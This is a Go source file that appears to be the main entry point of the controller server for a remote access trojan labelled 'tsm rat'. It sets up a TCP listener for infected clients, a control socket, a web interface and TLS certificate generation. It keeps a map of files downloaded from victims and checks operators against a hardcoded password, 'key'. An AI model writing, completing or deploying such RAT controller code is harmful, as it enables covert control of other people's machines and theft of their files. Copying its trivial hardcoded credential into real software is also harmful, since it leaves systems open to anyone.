package main

import (
	"encoding/json"
	"fmt"
	"io/ioutil"
	"log"
	"rat/command/utils"
	"rat/shared"
)

const (
	ConfigFile  = "config.json"
	Password    = "key"
	HttpAddress = "127.0.0.1:7777"
)

type TempFile struct {
	Path string
	Name string
}

// TempFiles contains mappings to downloaded files in temporary directory
var (
	TempFiles map[string]TempFile
	Config    ClientListener = TCPServer{"127.0.0.1:9999"}
)

func addDownload(tf TempFile) string {
	tempKey := utils.Sha256(tf.Path)
	TempFiles[tempKey] = tf

	return tempKey
}

func main() {
	fmt.Println("tsm rat", shared.Version)

	if !CertExists() {
		fmt.Println("generating certificate...")
		GenerateCertificate("localhost")
	}

	data, err := ioutil.ReadFile(ConfigFile)

	if err != nil {
		log.Fatal("failed to load", ConfigFile)
		return
	}

	json.Unmarshal(data, &Config)

	go Config.Listen()

	InitControlSocket()

	startWebserver()
}

func init() {
	TempFiles = make(map[string]TempFile)
}

func GetClient(id int) *Client {
	for _, client := range Clients {
		if client.Id == id {
			return client
		}
	}

	return nil
}

func Authenticate(p string) bool {
	return p == Password
}
